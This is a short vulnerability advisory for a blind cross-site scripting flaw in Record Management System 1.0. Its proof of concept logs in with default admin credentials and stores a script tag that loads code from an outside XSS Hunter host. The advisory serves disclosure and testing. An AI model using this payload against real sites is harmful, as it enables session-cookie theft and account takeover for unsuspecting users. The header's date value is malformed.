# Record_Management_System-Blind_Cross_Site_Scripting-2
+ **Exploit Title:** Record_Management_System-Blind_Cross_Site_Scripting-2
+ **Date:** 2023-26-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/record-management-system-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/01/RECORD_MANAGEMENT_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-

## References: 

## Description:
Record Management System 1.0 allows Blind Cross-Site Scripting via parameter 'docname' in "/recordmanagement/main/doctype.php". Record Management System is vulnerable to a blind cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Proof of Concept:
+ Go to the login panel: "http://localhost/recordmanagement/"
+ Login with `admin`:`admin`
+ Go to the Document Type: "http://localhost/recordmanagement/main/doctype.php"
+ Then go to the xsshunter app on https://xsshunter.trufflesecurity.com and login.
+ XSS PAYLOADS -> Copy Payload "Basic <script> Tag Payload"
+ Add Doc Type and Name with payload `"><script src="https://js.rip/b23tmbxf49"></script>`
+ Save and then go to XSS PAYLOAD FIRES on the xsshunter.
+ Check Reports.

![4-1](https://github.com/h4md153v63n/CVEs/assets/5091265/8bfdf785-ec1f-4c13-b744-0a113fb5dc7b)

![4-2](https://github.com/h4md153v63n/CVEs/assets/5091265/3b18e148-3622-4695-88f6-57291836d32c)

![4-3](https://github.com/h4md153v63n/CVEs/assets/5091265/d8c1cf8c-ce5f-46fd-bc21-cfcbfe0a2d93)

![4-4](https://github.com/h4md153v63n/CVEs/assets/5091265/b15fbf45-0d73-45f1-8cc2-7a06ab8b7c78)
